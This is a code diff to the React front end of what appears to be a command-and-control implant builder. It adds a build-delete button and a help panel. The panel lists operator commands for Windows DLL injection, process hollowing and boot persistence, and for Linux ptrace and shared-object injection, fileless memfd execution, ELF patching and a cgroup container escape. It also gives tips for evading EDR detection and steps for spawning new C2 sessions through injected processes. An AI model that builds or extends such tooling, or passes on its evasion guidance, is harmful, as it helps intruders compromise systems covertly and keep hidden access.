@@ -3,7 +3,7 @@ import styled from 'styled-components';
 import axios from 'axios';
 import { toast } from 'react-toastify';
 import { FaWindows, FaLinux } from 'react-icons/fa';
-import { FiDownload, FiRefreshCw, FiCpu } from 'react-icons/fi';
+import { FiDownload, FiRefreshCw, FiCpu, FiHelpCircle, FiChevronDown, FiTrash2 } from 'react-icons/fi';
 
 const Section = styled.section`
   animation: fadeIn 0.35s ease-out;
@@ -208,6 +208,133 @@ const BuildList = styled.div`
   gap: 6px;
 `;
 
+const HelpSection = styled.div`
+  margin-top: 32px;
+  padding-top: 24px;
+  border-top: 1px solid #2a3140;
+`;
+
+const HelpToggle = styled.button`
+  background: transparent;
+  border: none;
+  color: #8b93a7;
+  padding: 0;
+  font-size: 16px;
+  font-weight: 600;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  cursor: pointer;
+  transition: color 0.15s;
+  margin-bottom: 16px;
+
+  &:hover {
+    color: #c6f23e;
+  }
+
+  .chevron {
+    transition: transform 0.2s;
+    transform: ${props => props.$expanded ? 'rotate(180deg)' : 'rotate(0deg)'};
+  }
+`;
+
+const HelpContent = styled.div`
+  display: ${props => props.$show ? 'block' : 'none'};
+  animation: ${props => props.$show ? 'fadeIn 0.3s ease-out' : 'none'};
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(-8px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+`;
+
+const HelpTabs = styled.div`
+  display: flex;
+  gap: 4px;
+  margin-bottom: 20px;
+  border-bottom: 1px solid #2a3140;
+`;
+
+const HelpTab = styled.button`
+  background: ${props => props.$active ? 'rgba(198, 242, 62, 0.1)' : 'transparent'};
+  border: none;
+  color: ${props => props.$active ? '#c6f23e' : '#8b93a7'};
+  padding: 10px 16px;
+  font-size: 14px;
+  font-weight: 500;
+  cursor: pointer;
+  border-radius: 8px 8px 0 0;
+  border-bottom: 2px solid ${props => props.$active ? '#c6f23e' : 'transparent'};
+  transition: all 0.15s;
+
+  &:hover {
+    color: #c6f23e;
+    background: rgba(198, 242, 62, 0.05);
+  }
+
+  display: flex;
+  align-items: center;
+  gap: 6px;
+`;
+
+const CommandSection = styled.div`
+  margin-bottom: 24px;
+
+  h4 {
+    color: #eef1f6;
+    font-size: 15px;
+    font-weight: 600;
+    margin: 0 0 12px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  p {
+    color: #8b93a7;
+    font-size: 13px;
+    margin: 0 0 12px;
+    line-height: 1.5;
+  }
+`;
+
+const CommandList = styled.div`
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+`;
+
+const Command = styled.div`
+  background: #161a22;
+  border: 1px solid #2a3140;
+  border-radius: 6px;
+  padding: 12px;
+
+  .cmd-name {
+    color: #c6f23e;
+    font-family: 'Consolas', 'Monaco', monospace;
+    font-size: 13px;
+    font-weight: 600;
+    margin-bottom: 4px;
+  }
+
+  .cmd-desc {
+    color: #aeb6c7;
+    font-size: 12px;
+    line-height: 1.4;
+  }
+
+  .cmd-example {
+    color: #5c657a;
+    font-family: 'Consolas', 'Monaco', monospace;
+    font-size: 11px;
+    margin-top: 6px;
+    padding: 6px 8px;
+    background: rgba(0, 0, 0, 0.3);
+    border-radius: 4px;
+  }
+`;
+
 const BuildRow = styled.div`
   display: grid;
   grid-template-columns: 28px 1fr auto;
@@ -257,6 +384,8 @@ const ImplantBuilder = () => {
   const [outputName, setOutputName] = useState('');
   const [busy, setBusy] = useState(false);
   const [builds, setBuilds] = useState([]);
+  const [helpExpanded, setHelpExpanded] = useState(false);
+  const [helpTab, setHelpTab] = useState('windows');
 
   const loadDefaults = useCallback(async () => {
     try {
@@ -330,6 +459,106 @@ const ImplantBuilder = () => {
       toast.error('Download failed');
     }
   };
+
+  const handleDelete = async (id, fileName) => {
+    if (!window.confirm(`Delete build "${fileName}"?`)) {
+      return;
+    }
+    
+    try {
+      await axios.delete(`/api/builder/delete/${id}`, { headers: authHeaders() });
+      toast.success('Build deleted');
+      await loadBuilds();
+    } catch (e) {
+      toast.error(e.response?.data?.error || 'Delete failed');
+    }
+  };
+
+  const windowsCommands = [
+    {
+      name: 'injectdll',
+      desc: 'Classic DLL injection using CreateRemoteThread + LoadLibrary',
+      example: 'injectdll 1234 C:\\Users\\cui12\\AppData\\Local\\Temp\\winupdateb01c5c.exe'
+    },
+    {
+      name: 'injectapc',
+      desc: 'Stealthier injection via QueueUserAPC (process must be alertable)',
+      example: 'injectapc 1234 C:\\Users\\cui12\\AppData\\Local\\Temp\\winupdateb01c5c.exe'
+    },
+    {
+      name: 'injectmanual',
+      desc: 'Manual DLL mapping (no LoadLibrary, harder to detect)',
+      example: 'injectmanual 1234 C:\\Users\\cui12\\AppData\\Local\\Temp\\winupdateb01c5c.exe'
+    },
+    {
+      name: 'hollowprocess',
+      desc: 'Process hollowing - replace target process memory with payload',
+      example: 'hollowprocess C:\\Windows\\System32\\notepad.exe C:\\Users\\cui12\\AppData\\Local\\Temp\\winupdateb01c5c.exe'
+    },
+    {
+      name: 'processes',
+      desc: 'List all running processes to find target PIDs',
+      example: 'processes'
+    },
+    {
+      name: 'sysinfo',
+      desc: 'Get system information and current process details',
+      example: 'sysinfo'
+    },
+    {
+      name: 'checkpersistence',
+      desc: 'Check if current implant has persistence enabled',
+      example: 'checkpersistence'
+    },
+    {
+      name: 'setpersistence',
+      desc: 'Enable persistence (auto-start on boot)',
+      example: 'setpersistence'
+    }
+  ];
+
+  const linuxCommands = [
+    {
+      name: 'injectso',
+      desc: 'Inject shared library using dlopen via ptrace',
+      example: 'injectso 1234 /path/to/payload.so'
+    },
+    {
+      name: 'injectshellcode',
+      desc: 'Direct shellcode injection via ptrace',
+      example: 'injectshellcode 1234 \\x48\\x31\\xc0\\x50\\x48\\x89\\xe2...'
+    },
+    {
+      name: 'ldpreload',
+      desc: 'LD_PRELOAD hijacking for new processes',
+      example: 'ldpreload /path/to/malicious.so /bin/target_program'
+    },
+    {
+      name: 'memfd',
+      desc: 'Fileless execution using memfd_create',
+      example: 'memfd payload_base64_data target_args'
+    },
+    {
+      name: 'ptraceattach',
+      desc: 'Attach to process and manipulate memory/registers',
+      example: 'ptraceattach 1234 register_dump'
+    },
+    {
+      name: 'elfpatch',
+      desc: 'Patch ELF binary entry point or GOT',
+      example: 'elfpatch /path/to/binary payload_shellcode_hex'
+    },
+    {
+      name: 'sostomp',
+      desc: 'Shared object stomping - replace loaded .so',
+      example: 'sostomp 1234 libc.so.6 /path/to/payload.so'
+    },
+    {
+      name: 'cgroupescape',
+      desc: 'Container escape via cgroup manipulation',
+      example: 'cgroupescape /host_path_to_exploit'
+    }
+  ];
 
   return (
     <Section>
@@ -439,19 +668,125 @@ const ImplantBuilder = () => {
                       {new Date(b.createdAt).toLocaleString()} · {b.sha256?.slice(0, 8)}
                     </div>
                   </BuildMeta>
-                  <IconBtn
-                    type="button"
-                    title="Download"
-                    onClick={() => handleDownload(b.id, b.fileName)}
-                  >
-                    <FiDownload size={14} />
-                  </IconBtn>
+                  <div style={{ display: 'flex', gap: 4 }}>
+                    <IconBtn
+                      type="button"
+                      title="Download"
+                      onClick={() => handleDownload(b.id, b.fileName)}
+                    >
+                      <FiDownload size={14} />
+                    </IconBtn>
+                    <IconBtn
+                      type="button"
+                      title="Delete"
+                      onClick={() => handleDelete(b.id, b.fileName)}
+                      style={{ color: '#ff6b7a' }}
+                    >
+                      <FiTrash2 size={14} />
+                    </IconBtn>
+                  </div>
                 </BuildRow>
               ))
             )}
           </BuildList>
         </div>
       </Grid>
+
+      <HelpSection>
+        <HelpToggle 
+          $expanded={helpExpanded}
+          onClick={() => setHelpExpanded(!helpExpanded)}
+        >
+          <FiHelpCircle />
+          Advanced Commands & DLL Injection
+          <FiChevronDown className="chevron" />
+        </HelpToggle>
+
+        <HelpContent $show={helpExpanded}>
+          <HelpTabs>
+            <HelpTab 
+              $active={helpTab === 'windows'}
+              onClick={() => setHelpTab('windows')}
+            >
+              <FaWindows /> Windows
+            </HelpTab>
+            <HelpTab 
+              $active={helpTab === 'linux'}
+              onClick={() => setHelpTab('linux')}
+            >
+              <FaLinux /> Linux
+            </HelpTab>
+          </HelpTabs>
+
+          {helpTab === 'windows' && (
+            <div>
+              <CommandSection>
+                <h4>🔥 DLL Injection Techniques</h4>
+                <p>
+                  Force running processes to load your DLL, executing code with target privileges.
+                  Use PID from <code>processes</code> command.
+                </p>
+                <CommandList>
+                  {windowsCommands.map((cmd, i) => (
+                    <Command key={i}>
+                      <div className="cmd-name">{cmd.name}</div>
+                      <div className="cmd-desc">{cmd.desc}</div>
+                      <div className="cmd-example">Example: {cmd.example}</div>
+                    </Command>
+                  ))}
+                </CommandList>
+              </CommandSection>
+
+              <CommandSection>
+                <h4>📋 Usage Steps</h4>
+                <p>
+                  1. Run <code>processes</code> to find target PID<br/>
+                  2. Use <code>injectdll &lt;PID&gt; &lt;your_implant_path&gt;</code><br/>
+                  3. Injected process creates new C2 session<br/>
+                  4. Original session remains active
+                </p>
+              </CommandSection>
+
+              <CommandSection>
+                <h4>🛠️ Detection Evasion</h4>
+                <p>
+                  Modern EDRs detect CreateRemoteThread, RWX memory, and abnormal modules.
+                  Use APC injection for stealth. Manual mapping bypasses LoadLibrary hooks.
+                </p>
+              </CommandSection>
+            </div>
+          )}
+
+          {helpTab === 'linux' && (
+            <div>
+              <CommandSection>
+                <h4>🔥 Process Injection & SO Loading</h4>
+                <p>
+                  Linux injection via ptrace, LD_PRELOAD, and memory manipulation.
+                  Use PID from <code>processes</code> command.
+                </p>
+                <CommandList>
+                  {linuxCommands.map((cmd, i) => (
+                    <Command key={i}>
+                      <div className="cmd-name">{cmd.name}</div>
+                      <div className="cmd-desc">{cmd.desc}</div>
+                      <div className="cmd-example">Example: {cmd.example}</div>
+                    </Command>
+                  ))}
+                </CommandList>
+              </CommandSection>
+
+              <CommandSection>
+                <h4>🛠️ Stealth Considerations</h4>
+                <p>
+                  Avoid /proc inspection, use memfd for fileless payloads.
+                  Container escapes require host filesystem access.
+                </p>
+              </CommandSection>
+            </div>
+          )}
+        </HelpContent>
+      </HelpSection>
     </Section>
   );
 };
